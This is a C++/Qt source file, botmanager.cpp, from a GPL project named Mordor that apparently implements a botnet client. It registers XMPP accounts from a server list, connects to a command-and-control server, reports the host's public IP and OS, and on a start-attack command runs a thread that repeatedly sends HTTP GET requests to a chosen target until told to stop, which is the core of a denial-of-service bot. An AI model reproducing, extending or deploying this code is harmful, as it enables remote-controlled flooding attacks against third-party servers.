/**
 *  This file is part of Mordor.
 *
 *  Copyright (c) 2016 Juan Jose Salazar Garcia jjslzgc@gmail.com
 *
 *  Mordor is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  Mordor is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with Mordor.  If not, see <http://www.gnu.org/licenses/>.
 *
 **/

#include "botmanager.h"
#include "global.h"
#include "xmppclient.h"
#include "xmppregclient.h"
#include "bot.h"
#include "attacker.h"
#include "storagemanager.h"
#include "getbotstatecommand.h"
#include "startattackcommand.h"
#include "stopattackcommand.h"
#include "botstateresponse.h"
#include "attackstartedresponse.h"
#include "attackstoppedresponse.h"
#include <QThread>
#include <QNetworkInterface>
#include <QNetworkAccessManager>
#include <QNetworkRequest>
#include <QNetworkReply>
#include <QUrl>
#include <QSysInfo>
#include <QTime>
#include <iostream>

BotManager *BotManager::instance()
{
    static BotManager manager;

    return &manager;
}

void BotManager::connectToCC()
{
    QString jid = StorageManager::readConfig("jid").toString();
    QString password = StorageManager::readConfig("password").toString();

    _xmppClient -> connectToServer(jid, password);
}


void BotManager::disconnectFromCC()
{
    if(_xmppClient -> isConnected())
        writeEvent("Desconectado de CC");

    _xmppClient -> disconnectFromServer();
}

void BotManager::registerOnCC()
{
    static bool checked = false;
    static QStringList servers;

    if(!checked) {
        servers = StorageManager::readServerList();

        if(servers.isEmpty()) {
            writeEvent(QString("Lista de servidores en %1 no encontrada o vacia").arg(SERVER_LIST_FILE));
            emit serverListNotFound();

            return;
        }

        checked = true;
    }

    static QListIterator<QString> it(servers);

    if(!it.hasNext()) {
        writeEvent(QString("Registro fallido en todos los servidores de %1. Proximo intento en %2 minutos").arg(SERVER_LIST_FILE).arg(MINUTES_OF_WAITING));

        QThread::sleep(MINUTES_OF_WAITING * 60);

        it.toFront();
    }

    _xmppRegClient -> sendRegistrationRequest(it.next());
}

void BotManager::readyOnXmppClient()
{
    _bot -> setState(WaitingForCommand);

    writeEvent(QString("Conectado a CC como %1").arg(_xmppClient -> whoAmI()));
}

void BotManager::commandReceivedOnBot(Message *command)
{
    Message *response = 0;
    bool isValid = true;

    if(dynamic_cast<GetBotStateCommand *>(command)) {
        response = new BotStateResponse;
        dynamic_cast<BotStateResponse *>(response) -> setBot(_bot);

        writeEvent(QString("Recibido GET_BOT_STATE_CMD [1:1] de %1").arg(command -> from()));
        writeEvent(QString("Enviado BOT_STATE_RES [1:1] con (%1) a %2")
                   .arg(_bot -> toString())
                   .arg(command -> from()));
    } else if(StartAttackCommand *startAttackCommand = dynamic_cast<StartAttackCommand *>(command)) {
        response = new AttackStartedResponse(startAttackCommand -> id());

        writeEvent(QString("Recibido START_ATTACK_CMD [1:%1] de %2 con (id: %3 objetivo: %4)")
                   .arg(!command -> to().isEmpty() ? "1" : "N")
                   .arg(startAttackCommand -> from())
                   .arg(startAttackCommand -> id())
                   .arg(startAttackCommand -> target()));

        _bot -> setState(AttackInProgress);
        _bot -> setAttack(Attack(startAttackCommand -> id(), startAttackCommand -> target()));

        _attacker -> setTarget(_bot -> attack().target());
        _attackerThread -> start();

        writeEvent(QString("Iniciando ataque (%1)")
                   .arg(_bot -> attack().toString()));
        writeEvent(QString("Enviado ATTACK_STARTED_RES [1:1] a %1").arg(command -> from()));
    } else if(dynamic_cast<StopAttackCommand *>(command)) {
        response = new AttackStoppedResponse(command -> id());

        writeEvent(QString("Recibido STOP_ATTACK_CMD [1:N] de %1").arg(command -> from()));
        writeEvent(QString("Parando ataque (%1)")
                   .arg(_bot -> attack().toString()));

        _bot -> setState(WaitingForCommand);
        _bot -> setAttack(Attack());

        _attackerThread -> quit();
        _attackerThread -> wait();

        writeEvent(QString("Enviado ATTACK_STOPPED_RES [1:1] a %1").arg(command -> from()));
    } else
        isValid = false;

    if(isValid) {
        response -> setTo(command -> from());
        _xmppClient -> sendResponse(*response);
    }

    delete command;
}

void BotManager::attackDone()
{
    writeEvent(QString("Enviada peticion HTTP GET a %1").arg(_bot -> attack().target()));

    _attackerThread -> quit();
    _attackerThread -> wait();
    _attackerThread -> start();
}

void BotManager::finishedOnNetworkAccessManager(QNetworkReply *reply)
{
    QString ip;

    if(reply -> error() == QNetworkReply::NoError)
        ip = QString::fromLatin1(reply -> readAll());

    setupBot(ip);

    reply -> deleteLater();
}

void BotManager::successOnXmppRegClient(const QString& server, const QString &username, const QString &password)
{
    _xmppRegClient -> disconnectFromServer();

    writeEvent(QString("Registro exitoso en %1 para Usuario: %2 y Password: %3").arg(server).arg(username).arg(password));

    StorageManager::writeConfig("jid", QString("%1@%2").arg(username).arg(server));
    StorageManager::writeConfig("password", password);

    sendHttpGetRequestToDiscoverIp();
}

void BotManager::failureOnXmppRegClient(const QString& server, const QString& username, const QString& password)
{
    _xmppRegClient -> disconnectFromServer();

    writeEvent(QString("Registro fallido en %1 para Usuario: %2 y Password: %3").arg(server).arg(username).arg(password));

    registerOnCC();
}

BotManager::BotManager()
{
    _xmppClient = new XmppClient(APPLICATION_NAME);
    _xmppClient -> setParent(this);

    _xmppRegClient = new XmppRegClient(this);

    _bot = new Bot;

    _attackerThread = new QThread;

    _attacker = new Attacker;
    _attacker -> moveToThread(_attackerThread);

    _networkAccessManager = new QNetworkAccessManager(this);

    createConnections();

    setupConfig();
    sendHttpGetRequestToDiscoverIp();
}

BotManager::~BotManager()
{
    disconnectFromCC();

    delete _attacker;

    _attackerThread -> quit();
    _attackerThread -> wait();

    delete _attackerThread;
    delete _bot;
}

void BotManager::createConnections()
{
    connect(_xmppClient, SIGNAL(ready()),
            this, SLOT(readyOnXmppClient()));
    connect(_xmppClient, SIGNAL(commandReceived(Message *)),
            this, SLOT(commandReceivedOnBot(Message *)));
    connect(_xmppRegClient, SIGNAL(success(const QString&, const QString&, const QString&)),
            this, SLOT(successOnXmppRegClient(const QString&, const QString&, const QString&)));
    connect(_xmppRegClient, SIGNAL(failure(const QString&, const QString&, const QString&)),
            this, SLOT(failureOnXmppRegClient(const QString&, const QString&, const QString&)));
    connect(_attackerThread, SIGNAL(started()),
            _attacker, SLOT(attack()));
    connect(_attacker, SIGNAL(done()),
            this, SLOT(attackDone()));
    connect(_networkAccessManager, SIGNAL(finished(QNetworkReply *)),
            this, SLOT(finishedOnNetworkAccessManager(QNetworkReply *)));
}

void BotManager::setupConfig()
{
    if(!StorageManager::existsConfig())
        StorageManager::createConfig();
}

void BotManager::setupBot(const QString& pubIp)
{
    QString ip = pubIp;

    if(ip.isNull()) {
        foreach(QHostAddress address, QNetworkInterface::allAddresses())
            if(address != QHostAddress::LocalHost && address != QHostAddress::LocalHostIPv6) {
                ip = address.toString();
                break;
            }
    }

    QString id = StorageManager::readConfig("jid").toString();
    QString os = QString("%1 %2").arg(QSysInfo::prettyProductName()).arg(QSysInfo::currentCpuArchitecture());

    _bot -> setId(id);
    _bot -> setIp(ip);
    _bot -> setOs(os);
    _bot -> setState(WaitingForCC);

    if(!id.isEmpty())
        emit ready();
    else
        emit unregistered();
}

void BotManager::sendHttpGetRequestToDiscoverIp()
{
    _networkAccessManager -> get(QNetworkRequest(QUrl(IP_ADDRESS_API)));
}

void BotManager::writeEvent(const QString& event)
{
    std::cout << QString("[%1] %2").arg(QTime::currentTime().toString()).arg(event).toStdString() << std::endl;
}
